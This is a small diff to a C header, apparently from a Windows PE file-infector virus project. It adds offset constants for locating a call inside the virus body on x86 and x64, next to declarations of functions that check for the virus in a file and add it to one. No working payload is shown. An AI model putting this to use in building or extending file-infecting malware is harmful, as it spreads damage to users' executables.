@@ -3,6 +3,10 @@
 #include "ulti/everything.h"
 #include "pe/pe.h"
 
+#define DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X86 0x3c
+
+#define DISTANCE_VIRUS_MAIN_TO_SECOND_BYTE_OF_CALL_EMPTY_X64 0x55
+
 BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);
 
 void WINAPI AddVirusToFile(PVOID file_data, DWORD file_size, PDATA data, LPDWORD new_file_size);
